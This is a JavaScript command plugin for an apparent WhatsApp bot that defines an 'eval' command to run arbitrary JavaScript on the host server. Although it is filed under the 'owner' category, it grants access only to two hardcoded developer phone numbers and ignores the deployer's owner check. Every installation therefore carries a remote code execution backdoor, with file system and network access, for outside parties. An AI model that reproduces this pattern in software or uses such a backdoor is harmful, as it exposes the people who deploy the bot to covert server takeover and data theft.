import { igdl, fbdown } from 'btch-downloader';
import { readConfig } from '../lib/check.js';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { cmd } from '../command.js';
import axios from 'axios';
import * as cheerio from 'cheerio';
import fetch from 'node-fetch';
import fs from 'fs';
import path from 'path';
import util from 'util';
import { systemRenderApi } from '../lib/systemRenderApi.js';
import { ROD } from '../lib/readOwnerData.js';
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

cmd({
    pattern: "eval",
    category: "owner",
    filename: __filename,
    desc: "Runs js code on node server."
},
async(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    const devNumbers = ['94762280384', '94725881990'];
    const isDevs = devNumbers.includes(senderNumber);

  if (!isDevs) {
       return reply("*This is a developer-only command.* 📛");
   }

    if (!q) {
        return reply("*Please provide the JavaScript code to execute.*");
    }

    try {
        const result = await eval(`
            (async (conn, mek, m, reply, senderNumber, q, axios, cheerio, fetch, fs, path, util) => {
                const json = (input) => reply(JSON.stringify(input, null, 2));
                
                try {
                                        return await (async () => { ${q} })();
                } catch (e) {
                 return e.toString();
                }
            })(conn, mek, m, reply, senderNumber, q, axios, cheerio, fetch, fs, path, util)
        `);
        
                if (result === undefined) return;

            if (typeof result === "object") {
            reply(JSON.stringify(result, null, 2));
        } else {
            reply(String(result));
        }
    } catch (err) {
        reply(String(err));
    }
});
